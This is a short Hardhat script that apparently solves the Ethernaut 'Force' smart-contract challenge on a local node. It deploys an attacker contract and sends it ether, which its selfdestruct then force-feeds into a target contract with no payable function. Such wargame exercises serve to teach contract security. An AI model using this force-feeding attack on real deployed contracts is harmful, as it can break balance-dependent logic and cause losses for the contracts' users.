import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0x94099942864EA81cCF197E9D71ac53310b1468D8";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("Force" ,CONTRACT_ADDRESS,signer);

const attackerContractFactory = await ethers.getContractFactory("ForceAttack", signer)
const attackerContract =  await attackerContractFactory.deploy(CONTRACT_ADDRESS);

//HACK STEPS

// 1. Check current balance
let balance = await ethers.provider.getBalance(contract.address);
console.log("Current contract balance is: ", balance.toString());

// 2. Execute force-feeding attack via the attacker contract function that contains self-destruct. 
// We have to send ether accordingly to the designed attacker contract.
await attackerContract.feed({value: ethers.utils.parseEther('1')});

// 3. Check balance after call
balance = await ethers.provider.getBalance(CONTRACT_ADDRESS);
console.log("Updated balance is: ", balance.toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
